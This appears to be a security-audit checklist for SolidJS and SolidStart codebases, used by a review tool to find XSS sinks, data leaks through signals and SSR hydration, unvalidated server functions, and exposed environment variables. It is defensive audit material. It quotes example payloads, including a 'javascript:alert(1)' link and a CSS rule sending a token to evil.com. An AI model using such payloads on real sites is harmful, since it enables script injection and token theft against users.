---
name: SolidJS
detect:
  files: ["src/root.tsx", "src/root.jsx", "src/entry-server.tsx", "src/entry-client.tsx", "app.config.ts", "app.config.js"]
  dependencies: ["solid-js", "solid-start", "@solidjs/router", "@solidjs/meta", "@solidjs/start", "solid-styled-components", "solid-element"]
  keywords: ["SolidJS", "Solid.js", "SolidStart", "Solid Start"]
---

## attack-surface-frontend

**`innerHTML` XSS Audit:**
1. Grep for every instance of `innerHTML` used as a JSX prop in `.tsx`/`.jsx` files
   - SolidJS's `innerHTML` prop injects raw HTML into the DOM with zero sanitization (the Solid equivalent of React's dangerous HTML injection prop)
   - For EACH instance: trace the value to its source — is it user-controlled or from external data (API responses, URL params, database content)?
   - Is the HTML sanitized before assignment? (e.g., DOMPurify, sanitize-html)
   - Check for indirect assignment through signals: `const [html, setHtml] = createSignal(untrusted); <div innerHTML={html()} />`

**JSX Reactive Bypass Patterns:**
2. SolidJS auto-escapes string expressions in JSX, but these patterns bypass it:
   - `innerHTML` prop (the primary XSS vector)
   - Direct DOM manipulation via `ref`: `ref={(el) => { el.innerHTML = userInput }}` — SolidJS refs resolve to raw DOM nodes, making this more natural than in React
   - `onMount`/`createEffect` callbacks that write to `el.innerHTML` or `el.outerHTML`
   - `href` attributes with `javascript:` protocol: `<a href={userInput()}>` where the signal resolves to `javascript:alert(1)` — SolidJS does NOT sanitize `href` values
   - `style` attribute object injection: `<div style={userControlledObject} />` — can inject CSS-based data exfiltration (`background: url(https://evil.com/?token=...)`)
   - Spread operator with user data: `<div {...userProps} />` — attacker can inject `innerHTML`, event handlers (`onClick`, `onError`), or `style` through the spread object
   - `<Dynamic component={userControlledTag}>` — if the tag name is user-controlled, it can render `<script>`, `<iframe>`, or `<object>` elements

**Signal and Store Sensitive Data Leaks:**
3. Search for `createSignal`, `createStore`, and `createMemo` that hold sensitive data (tokens, PII, keys):
   - Signal values are accessible to any component in the reactive graph — can a child or sibling component access sensitive signals it shouldn't?
   - Are stores (`createStore`) containing auth tokens or session data exposed through context providers to the entire component tree?
   - `createRoot` scopes: is sensitive reactive state created outside component boundaries where it persists across navigations?
   - Are signal values serialized during SSR hydration? (SolidStart serializes reactive state — sensitive data in signals may appear in the HTML source)

**Context API Data Exposure:**
4. Grep for `createContext` and `useContext` usage:
   - Is sensitive data (tokens, roles, decrypted secrets) passed through context?
   - Can third-party components nested inside context providers access values they shouldn't?
   - Are context values included in error serialization through `<ErrorBoundary>`?

**`createEffect` and `createResource` Race Conditions:**
5. Review all `createEffect` and `createResource` calls:
   - `createEffect` does NOT automatically clean up async operations — does the effect return a cleanup function via `onCleanup` for in-flight requests?
   - Can a rapid signal change cause `createEffect` to fire with stale closure data before the previous async operation completes?
   - `createResource` with refetching: can a race between two fetches cause stale or wrong data to be rendered? (check for `mutate` calls that optimistically update before the fetch resolves)
   - If `createResource` results update auth/permission state, can a race condition cause a brief window where unauthorized data is visible?
   - Are `createResource` error states handled? Unhandled resource errors may bubble sensitive server details through `<ErrorBoundary>`

**Third-Party Component XSS:**
6. Third-party SolidJS or wrapped non-Solid components that render user data:
   - Rich text editors (TipTap, Lexical ports): do they sanitize output before feeding it back into SolidJS rendering?
   - Markdown renderers (`solid-markdown`): is raw HTML disabled?
   - Components from `solid-element` (custom elements): do they use `innerHTML` internally?
   - Wrapped React components (via `solid-react` or manual wrappers): do they introduce React-specific XSS vectors?

**Error Boundary Information Leaks:**
7. Does `<ErrorBoundary>` expose stack traces or internal data in production?
   - SolidJS `<ErrorBoundary fallback={err => ...}>` passes the raw error object to the fallback — is it rendered to the user?
   - Can a crafted input trigger an error that reveals internal component structure, file paths, or signal dependency graphs?
   - Are error details sent to a logging service or displayed in the UI?

## attack-surface-http

**SolidStart Server Functions (`"use server"`):**
1. Grep for `"use server"` directives in the codebase:
   - Every function marked `"use server"` becomes an RPC endpoint callable from the client — are ALL server functions validating and sanitizing their arguments?
   - **Critical**: Server functions receive serialized arguments from the client — can an attacker craft a malicious payload that bypasses type expectations? (TypeScript types are erased at runtime; no runtime validation unless explicitly added with zod, valibot, etc.)
   - Are server function arguments validated for type, length, and allowed values before use?
   - Can a server function be called out-of-order or with unexpected argument combinations?
   - Are server functions that perform mutations protected with CSRF tokens or SameSite cookies?
2. **Server function data exposure:**
   - Do server functions return more data than the client needs? (entire database rows when only a name is required)
   - Are server-only secrets (API keys, database credentials) accidentally closured into server functions that serialize return values?
   - Does the server function error path leak internal error messages, stack traces, or database query details to the client?

**SolidStart API Routes:**
3. Check `src/routes/api/` or route files with API handler exports:
   - Are API route handlers validating `Content-Type`, HTTP methods, and request body schemas?
   - Are CORS headers configured correctly? (Grep for `Access-Control-Allow-Origin: *` in middleware or route handlers)
   - Are API routes behind authentication middleware, or can unauthenticated clients access them?

**SSR Hydration Data Exposure:**
4. During SSR, SolidStart serializes component state into the HTML for client hydration:
   - **High**: Is sensitive data (tokens, internal IDs, admin flags, PII) present in signals or stores during SSR? It will be embedded in the HTML `<script>` tags as serialized state
   - Grep for `isServer` checks — are there code paths that include sensitive server-side data in the render only because an `isServer` guard is missing?
   - Check `createServerData$` / `routeData` / `cache` / `createAsync` return values — do they include fields that should remain server-only?

## config-infrastructure

**SolidStart Environment Variable Exposure:**
1. Grep for `import.meta.env` and `process.env` usage:
   - **Critical**: In Vite-based SolidStart, any env var prefixed with `VITE_` is bundled into client JavaScript and visible to all users — are secrets accidentally prefixed with `VITE_`?
   - Check `app.config.ts` / `vite.config.ts` for custom `envPrefix` that might expose more variables
   - Are server-only environment variables accessed only inside `"use server"` functions or server-only modules?
   - Is `.env` in `.gitignore`? Are `.env.local`, `.env.production` files committed?

**SolidStart Middleware and Server Configuration:**
2. Check middleware configuration (`src/middleware.ts` or `middleware` in `app.config.ts`):
   - Are security headers set? (`X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`)
   - Is there rate limiting on server functions and API routes?
   - Are session cookies configured with `HttpOnly`, `Secure`, `SameSite=Strict`?

**Build Output Inspection:**
3. If a built output exists (`.output/`, `dist/`):
   - Do client bundles contain server-only code that was tree-shaken incorrectly?
   - Are source maps deployed to production? (they reveal the full source code)
   - Are server modules accidentally included in the client bundle? (check for database drivers, secret managers, or server SDK imports in client chunks)

## dependency-audit

**SolidJS Ecosystem Supply Chain:**
1. Check for known vulnerable versions of SolidJS ecosystem packages:
   - `solid-js` versions < 1.6 had hydration mismatch issues that could cause client/server state divergence
   - `@solidjs/router` — are route parameters sanitized before use in server functions or data fetching?
   - Third-party SolidJS UI libraries: are they actively maintained? Do they use `innerHTML` internally?
2. Adapter security for SolidStart:
   - Which deployment adapter is used (`@solidjs/start` with node, netlify, cloudflare, etc.)?
   - Are adapter-specific security headers and configurations applied?
   - Is the adapter version current? Older adapters may have request parsing vulnerabilities
